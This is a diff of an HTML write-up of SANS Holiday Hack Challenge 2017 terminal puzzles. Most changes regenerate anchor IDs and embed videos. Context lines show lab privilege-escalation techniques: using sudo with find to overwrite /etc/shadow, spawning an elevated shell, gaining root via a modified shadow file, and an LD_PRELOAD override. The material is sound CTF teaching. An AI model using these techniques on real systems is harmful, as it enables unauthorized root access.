 Let's take a look at the executable we're dealing with:
@@ -1825,8 +1826,8 @@ elf@d5823d933b5d:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
 </div>
 </div>
 
-<div id="outline-container-orgf6588ac" class="outline-4">
-<h4 id="cryokinetic_solution"><a id="orgf6588ac"></a>Solution</h4>
+<div id="outline-container-orga206c59" class="outline-4">
+<h4 id="cryokinetic_solution"><a id="orga206c59"></a>Solution</h4>
 <div class="outline-text-4" id="text-cryokinetic_solution">
 <pre class="example">
 elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
@@ -1848,8 +1849,8 @@ The candy cane striping machine is up and running!
 </div>
 </div>
 
-<div id="outline-container-org7c9540f" class="outline-4">
-<h4 id="cryokinetic_alternatives"><a id="org7c9540f"></a>Alternatives</h4>
+<div id="outline-container-orge32d6b2" class="outline-4">
+<h4 id="cryokinetic_alternatives"><a id="orge32d6b2"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-cryokinetic_alternatives">
 <p>
 There are <b>many</b> different ways to solve this challenge.
@@ -1934,12 +1935,12 @@ elf@1e6fe4ce3449:~$ perl -e 'chmod 0755, "c"'
 </div>
 </div>
 </div>
-<div id="outline-container-org5fcf992" class="outline-3">
-<h3 id="org5fcf992">There's Snow Place Like Home</h3>
-<div class="outline-text-3" id="text-org5fcf992">
+<div id="outline-container-org3f85b81" class="outline-3">
+<h3 id="org3f85b81">There's Snow Place Like Home</h3>
+<div class="outline-text-3" id="text-org3f85b81">
 </div>
-<div id="outline-container-org726bf6a" class="outline-4">
-<h4 id="home_question"><a id="org726bf6a"></a>Question</h4>
+<div id="outline-container-org37a1ead" class="outline-4">
+<h4 id="home_question"><a id="org37a1ead"></a>Question</h4>
 <div class="outline-text-4" id="text-home_question">
 <pre class="example">
 
@@ -1966,8 +1967,8 @@ If you can get it running again, I will reward you with a gift of delight.
 </div>
 </div>
 
-<div id="outline-container-org31cb3ae" class="outline-4">
-<h4 id="home_how-to-find-the-terminal"><a id="org31cb3ae"></a>How to find the terminal</h4>
+<div id="outline-container-orgb929186" class="outline-4">
+<h4 id="home_how-to-find-the-terminal"><a id="orgb929186"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-home_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa">https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa</a>
@@ -1976,6 +1977,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/jdnzTyzyAPY?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -1986,8 +1989,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=405
 </div>
 </div>
 
-<div id="outline-container-orgf724754" class="outline-4">
-<h4 id="home_background-information"><a id="orgf724754"></a>Background Information</h4>
+<div id="outline-container-org2aa13cb" class="outline-4">
+<h4 id="home_background-information"><a id="org2aa13cb"></a>Background Information</h4>
 <div class="outline-text-4" id="text-home_background-information">
 <p>
 We're logged in as the user elf. There's a file called <code>trainstartup</code> in our home directory.
@@ -2004,8 +2007,8 @@ Linux 784e43534178 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_
 </div>
 </div>
 
-<div id="outline-container-orgc019808" class="outline-4">
-<h4 id="home_goal"><a id="orgc019808"></a>Goal</h4>
+<div id="outline-container-orgcff9d07" class="outline-4">
+<h4 id="home_goal"><a id="orgcff9d07"></a>Goal</h4>
 <div class="outline-text-4" id="text-home_goal">
 <p>
 It looks like we just want to run the <code>trainstartup</code> file, but if we try that, we get an exec error:
@@ -2018,8 +2021,8 @@ bash: ./trainstartup: cannot execute binary file: Exec format error
 </div>
 </div>
 
-<div id="outline-container-org0454f92" class="outline-4">
-<h4 id="home_hints"><a id="org0454f92"></a>Hints</h4>
+<div id="outline-container-org0f3a58d" class="outline-4">
+<h4 id="home_hints"><a id="org0f3a58d"></a>Hints</h4>
 <div class="outline-text-4" id="text-home_hints">
 <p>
 Pepper Minstix on Twitter has a hint:
@@ -2033,8 +2036,8 @@ Holly Evergreen on Twitter has a hint for this as well:
 </div>
 </div>
 
-<div id="outline-container-orgfa8251c" class="outline-4">
-<h4 id="home_approach"><a id="orgfa8251c"></a>Approach</h4>
+<div id="outline-container-org8e003a7" class="outline-4">
+<h4 id="home_approach"><a id="org8e003a7"></a>Approach</h4>
 <div class="outline-text-4" id="text-home_approach">
 <p>
 There's really not much to go on here. We'll first use <code>file</code> to identify the <code>trainstartup</code> binary:
@@ -2104,8 +2107,8 @@ Success!
 </div>
 </div>
 
-<div id="outline-container-org82a6f05" class="outline-4">
-<h4 id="home_solution"><a id="org82a6f05"></a>Solution</h4>
+<div id="outline-container-orgfa60d32" class="outline-4">
+<h4 id="home_solution"><a id="orgfa60d32"></a>Solution</h4>
 <div class="outline-text-4" id="text-home_solution">
 <p>
 You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./trainstartup</code>
@@ -2113,8 +2116,8 @@ You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./tr
 </div>
 </div>
 
-<div id="outline-container-org9e942cc" class="outline-4">
-<h4 id="home_alternatives"><a id="org9e942cc"></a>Alternatives</h4>
+<div id="outline-container-org9ac92a7" class="outline-4">
+<h4 id="home_alternatives"><a id="org9ac92a7"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-home_alternatives">
 <p>
 The real difficulty of this terminal was in discovering that you
@@ -2193,8 +2196,8 @@ elf@784e43534178:~$ find / -xdev -printf "%C+\t%p\n" | sort | head
 </div>
 </div>
 
-<div id="outline-container-orgc32ede8" class="outline-4">
-<h4 id="home_common-pitfalls"><a id="orgc32ede8"></a>Common Pitfalls</h4>
+<div id="outline-container-orge4ee884" class="outline-4">
+<h4 id="home_common-pitfalls"><a id="orge4ee884"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-home_common-pitfalls">
 <p>
 This terminal was tricky because almost no information was
@@ -2213,12 +2216,12 @@ Searching for this points us to using qemu as an emulator.
 </div>
 </div>
 </div>
-<div id="outline-container-org959931a" class="outline-3">
-<h3 id="org959931a">Bumble's Bounce</h3>
-<div class="outline-text-3" id="text-org959931a">
+<div id="outline-container-org750eba6" class="outline-3">
+<h3 id="org750eba6">Bumble's Bounce</h3>
+<div class="outline-text-3" id="text-org750eba6">
 </div>
-<div id="outline-container-org44817e2" class="outline-4">
-<h4 id="bounce_question"><a id="org44817e2"></a>Question</h4>
+<div id="outline-container-org2e0dcfe" class="outline-4">
+<h4 id="bounce_question"><a id="org2e0dcfe"></a>Question</h4>
 <div class="outline-text-4" id="text-bounce_question">
 <pre class="example">
                            ._    _.
@@ -2254,8 +2257,8 @@ Identifying the least-popular browser is your noteworthy goal.
 </div>
 </div>
 
-<div id="outline-container-orgf4bd7e9" class="outline-4">
-<h4 id="bounce_how-to-find-the-terminal"><a id="orgf4bd7e9"></a>How to find the terminal</h4>
+<div id="outline-container-orgf0f1e6d" class="outline-4">
+<h4 id="bounce_how-to-find-the-terminal"><a id="orgf0f1e6d"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-bounce_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a">https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a</a>
@@ -2264,6 +2267,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/YbWnc5Wb0T8?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -2274,14 +2279,14 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595
 </div>
 </div>
 
-<div id="outline-container-orge444108" class="outline-4">
-<h4 id="bounce_background-information"><a id="orge444108"></a>Background Information</h4>
+<div id="outline-container-orgcf7e760" class="outline-4">
+<h4 id="bounce_background-information"><a id="orgcf7e760"></a>Background Information</h4>
 <div class="outline-text-4" id="text-bounce_background-information">
 </div>
 </div>
 
-<div id="outline-container-org9503979" class="outline-4">
-<h4 id="bounce_goal"><a id="org9503979"></a>Goal</h4>
+<div id="outline-container-org793c4c5" class="outline-4">
+<h4 id="bounce_goal"><a id="org793c4c5"></a>Goal</h4>
 <div class="outline-text-4" id="text-bounce_goal">
 <p>
 The goal is to analyze a 'log file' and determine what the least popular browser.
@@ -2289,8 +2294,8 @@ The goal is to analyze a 'log file' and determine what the least popular browser
 </div>
 </div>
 
-<div id="outline-container-orgc670b2a" class="outline-4">
-<h4 id="bounce_hints"><a id="orgc670b2a"></a>Hints</h4>
+<div id="outline-container-orgaa5892d" class="outline-4">
+<h4 id="bounce_hints"><a id="orgaa5892d"></a>Hints</h4>
 <div class="outline-text-4" id="text-bounce_hints">
 <p>
 Minty Candycane on Twitter has some hints
@@ -2301,8 +2306,8 @@ Minty Candycane on Twitter has some hints
 </div>
 </div>
 
-<div id="outline-container-org807394f" class="outline-4">
-<h4 id="bounce_approach"><a id="org807394f"></a>Approach</h4>
+<div id="outline-container-org13a6dab" class="outline-4">
+<h4 id="bounce_approach"><a id="org13a6dab"></a>Approach</h4>
 <div class="outline-text-4" id="text-bounce_approach">
 <p>
 A directory listing shows that terminal contains a binary called 'runtoanswer',
@@ -2333,8 +2338,8 @@ since we just want the user-agents, we can split the log lines on the double quo
 </div>
 </div>
 
-<div id="outline-container-org96ee71d" class="outline-4">
-<h4 id="bounce_solution"><a id="org96ee71d"></a>Solution</h4>
+<div id="outline-container-orge3d2157" class="outline-4">
+<h4 id="bounce_solution"><a id="orge3d2157"></a>Solution</h4>
 <div class="outline-text-4" id="text-bounce_solution">
 <p>
 My solution is to use the <code>cut</code> tool, along with <code>sort</code> and <code>uniq</code> to find the least popular browser.
@@ -2404,14 +2409,14 @@ XX.YY.54.139 - - [27/Nov/2017:19:41:49 -0500] "GET /invoker/JMXInvokerServlet HT
 </div>
 </div>
 
-<div id="outline-container-org695f788" class="outline-4">
-<h4 id="bounce_alternatives"><a id="org695f788"></a>Alternatives</h4>
+<div id="outline-container-orga59b21c" class="outline-4">
+<h4 id="bounce_alternatives"><a id="orga59b21c"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-bounce_alternatives">
 </div>
 </div>
 
-<div id="outline-container-org2f87325" class="outline-4">
-<h4 id="bounce_common-pitfalls"><a id="org2f87325"></a>Common Pitfalls</h4>
+<div id="outline-container-org11f9095" class="outline-4">
+<h4 id="bounce_common-pitfalls"><a id="org11f9095"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-bounce_common-pitfalls">
 <p>
 The most common issue appeared to be the result of not normalizing the different browser versions.
@@ -2439,12 +2444,12 @@ elf@784e43534178:~$ cat access.log |cut -d '"' -f 6|cut -d ' ' -f 1|sort|uniq  -
 </div>
 </div>
 </div>
-<div id="outline-container-orgacb3305" class="outline-3">
-<h3 id="orgacb3305">I Don't Think We're In Kansas Anymore</h3>
-<div class="outline-text-3" id="text-orgacb3305">
+<div id="outline-container-org01fafce" class="outline-3">
+<h3 id="org01fafce">I Don't Think We're In Kansas Anymore</h3>
+<div class="outline-text-3" id="text-org01fafce">
 </div>
-<div id="outline-container-orga9742c1" class="outline-4">
-<h4 id="kansas_question"><a id="orga9742c1"></a>Question</h4>
+<div id="outline-container-orgbf29755" class="outline-4">
+<h4 id="kansas_question"><a id="orgbf29755"></a>Question</h4>
 <div class="outline-text-4" id="text-kansas_question">
 <pre class="example">
                        *
@@ -2480,8 +2485,8 @@ Identify the song whose popularity is the best.
 </div>
 </div>
 
-<div id="outline-container-orgee29643" class="outline-4">
-<h4 id="kansas_how-to-find-the-terminal"><a id="orgee29643"></a>How to find the terminal</h4>
+<div id="outline-container-org7e3bbb0" class="outline-4">
+<h4 id="kansas_how-to-find-the-terminal"><a id="org7e3bbb0"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-kansas_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168">https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168</a>
@@ -2490,6 +2495,10 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/Ex6NJiCcJe0?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/THNIj3Z14lE?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -2500,8 +2509,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab1
 </div>
 </div>
 
-<div id="outline-container-orgcf3b12c" class="outline-4">
-<h4 id="kansas_background-information"><a id="orgcf3b12c"></a>Background Information</h4>
+<div id="outline-container-org47191d5" class="outline-4">
+<h4 id="kansas_background-information"><a id="org47191d5"></a>Background Information</h4>
 <div class="outline-text-4" id="text-kansas_background-information">
 <p>
 When we login, we see we have two files of interest in our current
@@ -2535,8 +2544,8 @@ Your Pokemon Guide for Essential SQL Pen Test Commands
 </div>
 </div>
 
-<div id="outline-container-org613a5f6" class="outline-4">
-<h4 id="kansas_goal"><a id="org613a5f6"></a>Goal</h4>
+<div id="outline-container-orgcc9b75d" class="outline-4">
+<h4 id="kansas_goal"><a id="orgcc9b75d"></a>Goal</h4>
 <div class="outline-text-4" id="text-kansas_goal">
 <p>
 Determine which song in <code>christmassongs.db</code> has the most likes.
@@ -2544,8 +2553,8 @@ Determine which song in <code>christmassongs.db</code> has the most likes.
 </div>
 </div>
 
-<div id="outline-container-org5c78e64" class="outline-4">
-<h4 id="kansas_hints"><a id="org5c78e64"></a>Hints</h4>
+<div id="outline-container-orga749301" class="outline-4">
+<h4 id="kansas_hints"><a id="orga749301"></a>Hints</h4>
 <div class="outline-text-4" id="text-kansas_hints">
 <p>
 Sugarplum Mary on Twitter has a hint: 
@@ -2554,8 +2563,8 @@ Sugarplum Mary on Twitter has a hint:
 </div>
 </div>
 
-<div id="outline-container-org675287d" class="outline-4">
-<h4 id="kansas_approach"><a id="org675287d"></a>Approach</h4>
+<div id="outline-container-orgc1f1133" class="outline-4">
+<h4 id="kansas_approach"><a id="orgc1f1133"></a>Approach</h4>
 <div class="outline-text-4" id="text-kansas_approach">
 <p>
 Let's see exactly what this "db" file is:
@@ -2634,8 +2643,8 @@ sqlite&gt;
 </div>
 </div>
 
-<div id="outline-container-org8667ac7" class="outline-4">
-<h4 id="kansas_solution"><a id="org8667ac7"></a>Solution</h4>
+<div id="outline-container-orgab5aa28" class="outline-4">
+<h4 id="kansas_solution"><a id="orgab5aa28"></a>Solution</h4>
 <div class="outline-text-4" id="text-kansas_solution">
 <p>
 A one-liner is:
@@ -2648,8 +2657,8 @@ Stairway to Heaven
 </div>
 </div>
 
-<div id="outline-container-org5c23f87" class="outline-4">
-<h4 id="kansas_alternatives"><a id="org5c23f87"></a>Alternatives</h4>
+<div id="outline-container-org53dd6b0" class="outline-4">
+<h4 id="kansas_alternatives"><a id="org53dd6b0"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-kansas_alternatives">
 <p>
 Instead of joining the tables, we can first find what the most popular songid is:
@@ -2692,12 +2701,12 @@ method only has to look at one.
 </div>
 </div>
 </div>
-<div id="outline-container-org78dc254" class="outline-3">
-<h3 id="org78dc254">Oh Wait Maybe We Are</h3>
-<div class="outline-text-3" id="text-org78dc254">
+<div id="outline-container-org3a0b37d" class="outline-3">
+<h3 id="org3a0b37d">Oh Wait Maybe We Are</h3>
+<div class="outline-text-3" id="text-org3a0b37d">
 </div>
-<div id="outline-container-org5a55554" class="outline-4">
-<h4 id="we_are_question"><a id="org5a55554"></a>Question</h4>
+<div id="outline-container-org7dc9a9e" class="outline-4">
+<h4 id="we_are_question"><a id="org7dc9a9e"></a>Question</h4>
 <div class="outline-text-4" id="text-we_are_question">
 <pre class="example">
             --&gt;*&lt;--
@@ -2726,8 +2735,8 @@ Hint: What commands can you run with sudo?
 </div>
 </div>
 
-<div id="outline-container-orgd80f2c0" class="outline-4">
-<h4 id="we_are_how-to-find-the-terminal"><a id="orgd80f2c0"></a>How to find the terminal</h4>
+<div id="outline-container-org1155f54" class="outline-4">
+<h4 id="we_are_how-to-find-the-terminal"><a id="org1155f54"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-we_are_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5">https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5</a>
@@ -2736,6 +2745,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/kVKmTwQ7nNg?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -2746,8 +2757,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d
 </div>
 </div>
 
-<div id="outline-container-org0a722e3" class="outline-4">
-<h4 id="we_are_background-information"><a id="org0a722e3"></a>Background Information</h4>
+<div id="outline-container-orga16a185" class="outline-4">
+<h4 id="we_are_background-information"><a id="orga16a185"></a>Background Information</h4>
 <div class="outline-text-4" id="text-we_are_background-information">
 <p>
 We're logged in as the user <code>elf</code>. We happen to know that
@@ -2771,8 +2782,8 @@ We also know that <code>sudo</code> is a program that allows us to run commands 
 </div>
 </div>
 
-<div id="outline-container-org7e37125" class="outline-4">
-<h4 id="we_are_goal"><a id="org7e37125"></a>Goal</h4>
+<div id="outline-container-org7c8e752" class="outline-4">
+<h4 id="we_are_goal"><a id="org7c8e752"></a>Goal</h4>
 <div class="outline-text-4" id="text-we_are_goal">
 <p>
 We need to overwrite /etc/shadow with /etc/shadow.bak. Basically we
@@ -2787,8 +2798,8 @@ cp: cannot create regular file '/etc/shadow': Permission denied
 </div>
 </div>
 
-<div id="outline-container-org08f524d" class="outline-4">
-<h4 id="we_are_approach"><a id="org08f524d"></a>Hints</h4>
+<div id="outline-container-org2b9e769" class="outline-4">
+<h4 id="we_are_approach"><a id="org2b9e769"></a>Hints</h4>
 <div class="outline-text-4" id="text-we_are_approach">
 <p>
 Shinny Upatree on Twitter has a few hints:
@@ -2798,8 +2809,8 @@ Shinny Upatree on Twitter has a few hints:
 </div>
 </div>
 
-<div id="outline-container-org081cf2a" class="outline-4">
-<h4 id="we_are_approach"><a id="org081cf2a"></a>Approach</h4>
+<div id="outline-container-org255fbdc" class="outline-4">
+<h4 id="we_are_approach"><a id="org255fbdc"></a>Approach</h4>
 <div class="outline-text-4" id="text-we_are_approach">
 <p>
 If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run <code>sudo -h</code> to view the help documentation:
@@ -2927,8 +2938,8 @@ elf@784e43534178:~$ inspect_da_box
 </div>
 </div>
 
-<div id="outline-container-org73d15cd" class="outline-4">
-<h4 id="we_are_solution"><a id="org73d15cd"></a>Solution</h4>
+<div id="outline-container-org3c2beca" class="outline-4">
+<h4 id="we_are_solution"><a id="org3c2beca"></a>Solution</h4>
 <div class="outline-text-4" id="text-we_are_solution">
 <p>
 A one-liner is:
@@ -2940,8 +2951,8 @@ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow \; &amp;&amp; inspect_d
 </div>
 </div>
 
-<div id="outline-container-org6f2b8cc" class="outline-4">
-<h4 id="we_are_alternatives"><a id="org6f2b8cc"></a>Alternatives</h4>
+<div id="outline-container-org45bf430" class="outline-4">
+<h4 id="we_are_alternatives"><a id="org45bf430"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-we_are_alternatives">
 <p>
 Instead of using <code>find</code> to directly copy the file, we can just use it to start an elevated shell:
@@ -2962,8 +2973,8 @@ This shows how we can use <code>sudo</code> + <code>find</code> as a general pri
 </div>
 </div>
 
-<div id="outline-container-orgd9cb7a3" class="outline-4">
-<h4 id="we_are_common-pitfalls"><a id="orgd9cb7a3"></a>Common Pitfalls</h4>
+<div id="outline-container-org0967d41" class="outline-4">
+<h4 id="we_are_common-pitfalls"><a id="org0967d41"></a>Common Pitfalls</h4>
 <div class="outline-text-4" id="text-we_are_common-pitfalls">
 <p>
 <code>find</code>'s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
@@ -2982,9 +2993,9 @@ known.
 </div>
 </div>
 
-<div id="outline-container-org6632580" class="outline-4">
-<h4 id="org6632580">Going Further - Privilege Escalation</h4>
-<div class="outline-text-4" id="text-org6632580">
+<div id="outline-container-org5a9010e" class="outline-4">
+<h4 id="org5a9010e">Going Further - Privilege Escalation</h4>
+<div class="outline-text-4" id="text-org5a9010e">
 <p>
 This is neat, but let's elevate privileges to root on this
 terminal. Our approach will be to put in a modified shadow file
@@ -3031,12 +3042,12 @@ uid=0(root) gid=0(root) groups=0(root)
 </div>
 </div>
 </div>
-<div id="outline-container-org7ed1cdd" class="outline-3">
-<h3 id="org7ed1cdd">We're Off To See The</h3>
-<div class="outline-text-3" id="text-org7ed1cdd">
+<div id="outline-container-org5ba2a83" class="outline-3">
+<h3 id="org5ba2a83">We're Off To See The</h3>
+<div class="outline-text-3" id="text-org5ba2a83">
 </div>
-<div id="outline-container-org4e59120" class="outline-4">
-<h4 id="off_question"><a id="org4e59120"></a>Question</h4>
+<div id="outline-container-orga754afa" class="outline-4">
+<h4 id="off_question"><a id="orga754afa"></a>Question</h4>
 <div class="outline-text-4" id="text-off_question">
 <pre class="example">
 
@@ -3058,8 +3069,8 @@ You will need to write your own code, but only a line or two.
 </div>
 </div>
 
-<div id="outline-container-org6a21ebe" class="outline-4">
-<h4 id="off_how-to-find-the-terminal"><a id="org6a21ebe"></a>How to find the terminal</h4>
+<div id="outline-container-org3a0a1f3" class="outline-4">
+<h4 id="off_how-to-find-the-terminal"><a id="org3a0a1f3"></a>How to find the terminal</h4>
 <div class="outline-text-4" id="text-off_how-to-find-the-terminal">
 <p>
 From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec">https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec</a>
@@ -3068,6 +3079,8 @@ From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f93
 <p>
 Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&amp;uid=USER_ID</a>
 </p>
+
+<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/NaNbpX8H03I?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
 
 <div class="figure">
@@ -3078,8 +3091,8 @@ Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=964
 </div>
 </div>
 
-<div id="outline-container-org3a94069" class="outline-4">
-<h4 id="off_background-information"><a id="org3a94069"></a>Background Information</h4>
+<div id="outline-container-org289a776" class="outline-4">
+<h4 id="off_background-information"><a id="org289a776"></a>Background Information</h4>
 <div class="outline-text-4" id="text-off_background-information">
 <p>
 We are logged in as the user <code>elf</code>.
@@ -3108,8 +3121,8 @@ Two files are provided
 </div>
 </div>
 
-<div id="outline-container-orgfa360ef" class="outline-4">
-<h4 id="off_goal"><a id="orgfa360ef"></a>Goal</h4>
+<div id="outline-container-org5d60c39" class="outline-4">
+<h4 id="off_goal"><a id="org5d60c39"></a>Goal</h4>
 <div class="outline-text-4" id="text-off_goal">
 <p>
 For this challenge we need to write our own code in order to make the provided binary <code>isit42</code> return 42.
@@ -3117,8 +3130,8 @@ For this challenge we need to write our own code in order to make the provided b
 </div>
 </div>
 
-<div id="outline-container-orgc7a168e" class="outline-4">
-<h4 id="off_hints"><a id="orgc7a168e"></a>Hints</h4>
+<div id="outline-container-orge6ad8b1" class="outline-4">
+<h4 id="off_hints"><a id="orge6ad8b1"></a>Hints</h4>
 <div class="outline-text-4" id="text-off_hints">
 <p>
 <a href="https://twitter.com/1Horse1OSSleigh">Wunorse Openslae (that's a stretch) on Twitter actually has no useful hints</a>
@@ -3130,8 +3143,8 @@ This blog post, <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-
 </div>
 </div>
 
-<div id="outline-container-org004e188" class="outline-4">
-<h4 id="off_approach"><a id="org004e188"></a>Approach</h4>
+<div id="outline-container-orgd56d298" class="outline-4">
+<h4 id="off_approach"><a id="orgd56d298"></a>Approach</h4>
 <div class="outline-text-4" id="text-off_approach">
 <p>
 [[<a href="https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9">https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9</a>][Our team actually did this exact thing last year in order to derandomize <code>wumpus</code>.]
@@ -3157,8 +3170,8 @@ If we create our own library file to define <code>rand()</code> we can remove th
 </div>
 </div>
 
-<div id="outline-container-orgf6ef7d7" class="outline-4">
-<h4 id="off_solution"><a id="orgf6ef7d7"></a>Solution</h4>
+<div id="outline-container-org7e34faa" class="outline-4">
+<h4 id="off_solution"><a id="org7e34faa"></a>Solution</h4>
 <div class="outline-text-4" id="text-off_solution">
 <p>
 As mentioned in the hints section above, we can use <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Jeff McJunkin's</a> blog post for guidance on how to complete this challenge.
@@ -3222,8 +3235,8 @@ Congratulations! You've won, and have successfully completed this challenge.
 </div>
 </div>
 
-<div id="outline-container-orgeb4492f" class="outline-4">
-<h4 id="off_alternatives"><a id="orgeb4492f"></a>Alternatives</h4>
+<div id="outline-container-org27d177d" class="outline-4">
+<h4 id="off_alternatives"><a id="org27d177d"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-off_alternatives">
 <p>
 Another option is to just brute force it.  The sample code shows that the program is using
@@ -3305,16 +3318,16 @@ Starting up ...                  .-.
 </div>
 </div>
 </div>
-<div id="outline-container-orgb27f4c4" class="outline-2">
-<h2 id="orgb27f4c4"><span class="todo TODO">TODO</span> Answers</h2>
-<div class="outline-text-2" id="text-orgb27f4c4">
+<div id="outline-container-orgbe12c66" class="outline-2">
+<h2 id="orgbe12c66"><span class="todo TODO">TODO</span> Answers</h2>
+<div class="outline-text-2" id="text-orgbe12c66">
 </div>
-<div id="outline-container-org8c00b1f" class="outline-3">
-<h3 id="org8c00b1f">Game: This Page Fell off a Truck</h3>
-<div class="outline-text-3" id="text-org8c00b1f">
+<div id="outline-container-org9f54971" class="outline-3">
+<h3 id="org9f54971">Game: This Page Fell off a Truck</h3>
+<div class="outline-text-3" id="text-org9f54971">
 </div>
-<div id="outline-container-orgb8fb18e" class="outline-4">
-<h4 id="q1_question"><a id="orgb8fb18e"></a>Question</h4>
+<div id="outline-container-org995f267" class="outline-4">
+<h4 id="q1_question"><a id="org995f267"></a>Question</h4>
 <div class="outline-text-4" id="text-q1_question">
 <p>
 Visit the North Pole and Beyond at the Winter Wonder Landing Level to
@@ -3324,8 +3337,8 @@ is the title of that page?
 </div>
 </div>
 
-<div id="outline-container-orgc26c549" class="outline-4">
-<h4 id="q2_solution"><a id="orgc26c549"></a>Solution</h4>
+<div id="outline-container-org0e20a15" class="outline-4">
+<h4 id="q2_solution"><a id="org0e20a15"></a>Solution</h4>
 <div class="outline-text-4" id="text-q2_solution">
 <p>
 This question simply requires playing the <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">Winter Wonder Landing</a> game
@@ -3338,12 +3351,12 @@ This challenge was primarily to get players introduced to the game aspect of the
 </div>
 </div>
 </div>
-<div id="outline-container-org274b925" class="outline-3">
-<h3 id="org274b925">L2S: Letters to Santa</h3>
-<div class="outline-text-3" id="text-org274b925">
+<div id="outline-container-orgfad0903" class="outline-3">
+<h3 id="orgfad0903">L2S: Letters to Santa</h3>
+<div class="outline-text-3" id="text-orgfad0903">
 </div>
-<div id="outline-container-orgd1972fa" class="outline-4">
-<h4 id="q2_question"><a id="orgd1972fa"></a>Question</h4>
